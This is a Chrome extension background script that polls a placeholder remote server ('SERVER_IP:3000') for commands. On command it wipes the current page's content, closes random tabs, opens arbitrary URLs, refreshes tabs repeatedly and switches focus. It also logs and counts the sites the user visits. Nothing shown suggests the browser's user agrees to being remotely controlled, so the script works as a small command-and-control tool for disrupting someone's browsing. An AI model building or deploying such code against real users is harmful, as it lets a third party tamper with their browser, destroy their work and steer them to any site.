let tracking = false;
const url = "http://SERVER_IP:3000/getMessages";
const user = "USER_NAME";
let startTime;

const sleep = (ms) => new Promise((r) => setTimeout(r, ms))

async function getCurrentTab() { // Sometime getCurrentTab() return undefined idk why
  let queryOptions = { active: true, lastFocusedWindow: true };
  let [tab] = await chrome.tabs.query(queryOptions);
  return tab;
}

function openNewTab(url) {
  chrome.tabs.create({ url: url});
}

function killRandomTab() {
  chrome.tabs.query({ currentWindow: true }, function (tabs) {
    while (tabs === undefined) { }
    const random = Math.floor(Math.random() * tabs.length);
    chrome.tabs.remove(tabs[random].id);
  });
}

function refreshTab() { 
  getCurrentTab().then(tab => {
    chrome.tabs.reload(tab.id)
  })
}

function destroyThePage() {
  document.body.innerHTML = "";
}

let destroy_counter;

function destroyPage() {
  console.log("Enter destroyPage")
  getCurrentTab().then(tab => {
    chrome.scripting.executeScript({
      target: { tabId: tab.id },
      function: destroyThePage,
    });
  })
}

function focusFirstTab() {
  chrome.tabs.query({ currentWindow: true }, function (tabs) {
    const random = Math.floor(Math.random() * tabs.length)
    chrome.tabs.update(tabs[random].id, {active:true, highlighted:true})
  })
}

function pollServer() {
  console.log("Enter pollServer")
  fetch(`${url}?user=${user}`)
    .then(response => response.json())
    .then(data => {
      console.log(data)
      if (data.message) {
        const message_parts = data.message.split(' ')
        switch (message_parts[0]) {
          case 'destroy':
            destroy_counter = +message_parts[1]
            break;
          case 'killRandomTab':
            for (let i = 0; i < +message_parts[1]; i++) {
              killRandomTab()
            }
            break
          case 'openNewTab':
            openNewTab(message_parts[1])
            break
          case 'refreshTab':
            for (let i = 0;i < +message_parts[1]; i++) {
              refreshTab()
            }
            break
          case 'focusFirst':
            focusFirstTab()
            break
          default:
            break;
        }
        console.log('Received message from server:', data.message)
      }
      pollServer()
    })
    .catch(async err => {
      console.log('Error polling server. ', err)
      await sleep(2000)
      pollServer()
    })
}

chrome.runtime.onStartup.addListener(() => {
  console.log("Enter onStartup")
  chrome.storage.sync.set({ pageLoaded: 0, spentTime: 0 })
  pollServer()
})

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.message === "startTracking") {
    tracking = true;
  } else if (request.message === "stopTracking") {
    tracking = false;
  }
});

chrome.webNavigation.onCompleted.addListener(details => {

  console.log("Enter webNavigation.onCompleted")

  if (tracking) {
    console.log(`User visited: ${details.url}`);

    if (destroy_counter) {
      destroyPage()
      destroy_counter--;
    }

    const endTime = Date.now()
    const elapsedTime = endTime - startTime
    chrome.storage.sync.get("spentTime", result => {
      const lastTime = result.spentTime || 0
      chrome.storage.sync.set({ spentTime: lastTime + elapsedTime })
      startTime = endTime
    })


    chrome.storage.sync.get("pageLoaded", result => {
      const currentPageLoaded = result.pageLoaded || 0
      const newPageLoaded = currentPageLoaded + 1;
      chrome.storage.sync.set({ pageLoaded: newPageLoaded });
    });
  }
});
